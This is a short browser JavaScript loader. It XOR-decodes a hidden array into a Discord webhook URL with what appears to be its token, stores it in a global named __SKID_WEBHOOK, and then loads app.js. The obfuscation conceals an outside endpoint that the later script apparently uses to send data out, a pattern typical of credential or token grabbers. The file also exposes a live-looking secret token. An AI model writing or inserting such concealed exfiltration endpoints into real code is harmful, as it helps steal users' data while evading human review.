(function () {
  var XOR_MASK = 167;
  var webhookObfuscated = [207, 211, 211, 215, 212, 157, 136, 136, 195, 206, 212, 196, 200, 213, 195, 137, 196, 200, 202, 136, 198, 215, 206, 136, 208, 194, 197, 207, 200, 200, 204, 212, 136, 150, 146, 149, 151, 149, 147, 149, 151, 144, 151, 144, 145, 147, 148, 158, 149, 146, 146, 150, 136, 244, 245, 243, 240, 204, 255, 194, 215, 255, 194, 201, 159, 202, 227, 211, 246, 212, 208, 146, 238, 229, 148, 147, 232, 229, 239, 212, 221, 214, 194, 224, 201, 158, 228, 202, 234, 235, 241, 228, 203, 224, 200, 248, 150, 239, 253, 203, 215, 208, 228, 225, 230, 242, 255, 201, 206, 149, 203, 151, 202, 200, 223, 234, 248, 148, 236, 211, 150];

  function revealWebhook() {
    var out = "";
    for (var i = 0; i < webhookObfuscated.length; i++) {
      out += String.fromCharCode(webhookObfuscated[i] ^ XOR_MASK);
    }
    return out;
  }

  function loadApp() {
    var script = document.createElement("script");
    script.src = "app.js";
    script.async = false;
    document.body.appendChild(script);
  }

  window.__SKID_WEBHOOK = revealWebhook();
  loadApp();
})();
